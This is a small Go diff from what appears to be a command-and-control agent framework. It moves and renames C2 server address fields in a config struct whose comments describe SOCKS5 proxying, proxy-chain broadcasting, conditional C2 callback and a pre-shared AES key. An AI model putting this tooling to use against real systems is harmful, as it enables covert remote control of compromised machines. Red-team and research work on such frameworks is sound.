@@ -29,7 +29,7 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 	}
 
 	// these variables are decided by other variables
-	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCHost)
+	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCAddress)
 	DefaultShell = config_to_write.UtilsPath + "/bash"
 	AESKey = GenAESKey("Your Pre Shared AES Key: " + MagicString)
 
@@ -38,6 +38,8 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 
 // Config build.json config file
 type Config struct {
+	CCAddress                      string `json:"CCAddress"`                      // Address of C2 server, might include port (agent side)
+	CCHost                         string `json:"CCHost"`                         // Hostname of C2 server (hostname only)
 	CCPort                         string `json:"CCPort"`                         // CC service port, TLS enabled
 	AgentSocksServerPort           string `json:"AgentSocksServerPort"`           // agent side socks5 proxy server port
 	AgentSocksTimeout              int    `json:"AgentSocksTimeout"`              // timeout (in seconds) for agent side Socks5 server, 0 to disable
@@ -55,7 +57,6 @@ type Config struct {
 	ProxyChainBroadcastPort        string `json:"ProxyChainBroadcastPort"`        // UDP port used for broadcasting msg, used by auto proxy chain
 	ProxyChainBroadcastIntervalMin int    `json:"ProxyChainBroadcastIntervalMin"` // seconds, set max to 0 to disable
 	ProxyChainBroadcastIntervalMax int    `json:"ProxyChainBroadcastIntervalMax"` // seconds, set max to 0 to disable
-	CCHost                         string `json:"CCHost"`                         // Address of C2 server
 	PIDFile                        string `json:"PIDFile"`                        // PID of agent process
 	CCIndicatorURL                 string `json:"CCIndicatorURL"`                 // URL of conditional C2 connection, CC indicator
 	CCIndicatorWaitMin             int    `json:"CCIndicatorWaitMin"`             // seconds
